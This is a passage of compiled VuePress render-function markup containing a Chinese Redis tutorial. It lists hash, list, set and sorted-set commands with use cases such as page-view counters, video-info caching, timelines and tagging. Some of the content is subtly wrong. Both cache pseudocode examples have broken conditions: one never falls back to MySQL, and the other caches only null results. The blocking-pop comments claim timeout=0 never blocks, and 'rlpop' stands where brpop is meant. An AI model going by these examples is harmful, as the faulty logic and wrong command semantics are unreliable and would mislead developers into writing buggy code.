\"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"29\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"30\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"31\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"32\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"33\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"34\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"35\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"36\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"37\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"38\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"39\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"40\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"41\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"实战\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#实战\"}},[s._v(\"#\")]),s._v(\" 实战\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"记录网站每个用户个人主页的访问量\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"incr userid:pageview\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"缓存视频的基本信息（数据源在 MySQL 中）伪代码\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"public VideoInfo get(long id) {\\n    String redisKey = redisPrefix + id;\\n    VideoInfo videoInfo = redis.get(redisKey);\\n    if (videoInfo != null) {\\n        redis.set(redisKey, serialize(videoInfo));\\n    }\\n    return videoInfo;\\n}\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"分布式 id 生成器\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"incr \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"id\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"哈希\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#哈希\"}},[s._v(\"#\")]),s._v(\" 哈希\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取hash key对应field的value\")]),s._v(\"\\nhget key field\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置hash key对应field的value\")]),s._v(\"\\nhset key field value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#删除hash key对应field的value\")]),s._v(\"\\nhdel key field\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#判断hash key是否有field\")]),s._v(\"\\nhexists key field\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取hash key field的数量\")]),s._v(\"\\nhlen key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#批量获取hash key的一批field对应的值\")]),s._v(\"\\nhmget key field1 field2 \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\". fieldN\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#批量设置hash key的一批field value\")]),s._v(\"\\nhmset key field1 value1 field2 value2\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".fieldN valueN\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回hash key对应所有的field和value\")]),s._v(\"\\nhgetall key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回hash key对应所有field的value\")]),s._v(\"\\nhvals key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回hash key对应所有field\")]),s._v(\"\\nhkeys key\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置hash key对应field的value(如field已经存在，则失败)\")]),s._v(\"\\nhsetnx key field value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#hash key对应的field的value自增intCount\")]),s._v(\"\\nhincrby key field intCount\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#hincrby浮点数版\")]),s._v(\"\\nhincrbyfloat key field floatCount\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"实战-2\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#实战-2\"}},[s._v(\"#\")]),s._v(\" 实战\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"记录网站每个用户个人主页的访问量\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[s._v(\"hincrby user:1:info pageview count\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\")])]),t(\"ul\",[t(\"li\",[s._v(\"缓存视频的基本信息（数据源在 MySQL 中）伪代码\")])]),s._v(\" \"),t(\"div\",{staticClass:\"language- line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[t(\"code\",[s._v(\"public VideoInfo get(long id) {\\n    String redisKey = redisPrefix + id;\\n    Map<String, String> hashMap = redis.hgetAll(redisKey);\\n    VideoInfo videoInfo = transferMapToVideo(hashMap);\\n    if (videoInfo == null) {\\n        videoInfo = mysql.get(id);\\n        if (videoInfo == null) {\\n            redis.hmset(redisKey, transferVideoToMap(videoInfo));\\n        }\\n    }\\n    return videoInfo;\\n}\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\")])]),t(\"h3\",{attrs:{id:\"列表\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#列表\"}},[s._v(\"#\")]),s._v(\" 列表\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#从列表右端插入值（1-N个）\")]),s._v(\"\\nrpush key value1 value2 \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".valueN\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#从列表左端插入值（1-N个）\")]),s._v(\"\\nlpush key value1 value2 \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"..\")]),s._v(\".valueN\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#在list指定的值前|后插入newValue\")]),s._v(\"\\nlinsert key before\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"after value newValue\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#从列表左侧弹出一个item\")]),s._v(\"\\nlpop key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#从列表右侧弹出一个item\")]),s._v(\"\\nrpop key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#根据count值，从列表中删除所有value相等的项\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#(1)count>0，从左到右，删除最多count个value相等的项\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#(2)count<0，从右到左，删除最多Math.abs(count)个value相等的项\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#(3)count=0，删除所有value相等的项\")]),s._v(\"\\nlrem key count value\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#按照索引范围修剪列表\")]),s._v(\"\\nltrim key start end\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取列表指定索引范围所有item\")]),s._v(\"\\nlrange key start end\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取列表指定索引的item\")]),s._v(\"\\nlindex key index\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取列表长度\")]),s._v(\"\\nllen key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#设置列表指定索引值为newValue\")]),s._v(\"\\nlset key index newValue\\n\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#lpop阻塞版本，timeout是阻塞超时时间，timeout=0永远不阻塞\")]),s._v(\"\\nblpop key \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"timeout\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#rpop阻塞版本，timeout是阻塞超时时间，timeout=0永远不阻塞\")]),s._v(\"\\nrlpop key \"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"timeout\")]),s._v(\"\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"29\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"30\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"实战-3\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#实战-3\"}},[s._v(\"#\")]),s._v(\" 实战\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"TimeLine\")])]),s._v(\" \"),t(\"p\",[s._v(\"你关注的人更新微博，LPUSH\")]),s._v(\" \"),t(\"h4\",{attrs:{id:\"tips\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#tips\"}},[s._v(\"#\")]),s._v(\" Tips\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"LPUSH + LPOP = Stack\")]),s._v(\" \"),t(\"li\",[s._v(\"LPUSH + RPOP = Queue\")]),s._v(\" \"),t(\"li\",[s._v(\"LPUSH + LTRIM = Capped Collection\")]),s._v(\" \"),t(\"li\",[s._v(\"LPUSH + BRPOP = Message Queue\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"集合\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#集合\"}},[s._v(\"#\")]),s._v(\" 集合\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#向集合key添加element（如果element已经存在，添加失败）\")]),s._v(\"\\nsadd key element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#将集合key中的element移除掉\")]),s._v(\"\\nsrem key element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#计算集合大小\")]),s._v(\"\\nscard key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#判断element是否在集合中\")]),s._v(\"\\nsismember key element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#从集合中随机挑count个元素\")]),s._v(\"\\nsrandmember key count\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#从集合中随机弹出一个元素\")]),s._v(\"\\nspop key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#获取集合所有元素\")]),s._v(\"\\nsmembers key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#差集\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sdiff\")]),s._v(\" key1 key2\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#交集\")]),s._v(\"\\nsinter key1 key2\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#并集\")]),s._v(\"\\nsunion key1 key2\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#将差集、交集、并集结果保存到destkey\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sdiff\")]),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"sinter\"),t(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"|\")]),s._v(\"sunion + store destkey\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"tips-2\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#tips-2\"}},[s._v(\"#\")]),s._v(\" TIPS\")]),s._v(\" \"),t(\"ul\",[t(\"li\",[s._v(\"SADD = Tagging\")]),s._v(\" \"),t(\"li\",[s._v(\"SPOP/SRANDMEMBER = Random item\")]),s._v(\" \"),t(\"li\",[s._v(\"SADD + SINTER = Social Graph\")])]),s._v(\" \"),t(\"h3\",{attrs:{id:\"有序集合\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#有序集合\"}},[s._v(\"#\")]),s._v(\" 有序集合\")]),s._v(\" \"),t(\"div\",{staticClass:\"language-shell line-numbers-mode\"},[t(\"pre\",{pre:!0,attrs:{class:\"language-shell\"}},[t(\"code\",[t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#添加score和element\")]),s._v(\"\\nzadd key score element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#删除元素\")]),s._v(\"\\nzrem key element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回元素的分数\")]),s._v(\"\\nzscore key element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#增加或减少元素的分数\")]),s._v(\"\\nzincrby key increScore element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回元素的总个数\")]),s._v(\"\\nzcard key\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回元素的排名\")]),s._v(\"\\nzrank key element\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回指定索引范围内的升序元素[分值]\")]),s._v(\"\\nzrange key start end \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"WITHSCORES\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回指定分数范围内的升序元素[分值]\")]),s._v(\"\\nzrangebyscore key minScore maxScore \"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"WITHSCORES\"),t(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\"\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#返回有序集合内在指定分数范围内的个数\")]),s._v(\"\\nzcount key minScore maxScore\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#删除指定排名内的升序元素\")]),s._v(\"\\nzremrangebyrank key start end\\n\"),t(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"#删除指定分数内的升序元素\")]),s._v(\"\\nzremrangebyscore key minScore maxScore\\n\\nzrevrank\\nzrevrange\\nzrevrangebyscore\\nzinterstore\\nzunionstore\\n\")])]),s._v(\" \"),t(\"div\",{staticClass:\"line-numbers-wrapper\"},[t(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"21\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"22\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"23\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"24\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"25\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"26\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"27\")]),t(\"br\"),t(\"span\",{staticClass:\"line-number\"},[s._v(\"28\")]),t(\"br\")])]),t(\"h4\",{attrs:{id:\"实战-4\"}},[t(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#实战-4\"}},[s._v(\"#\")]),s._v(\" 实战\")]),s._v(\" 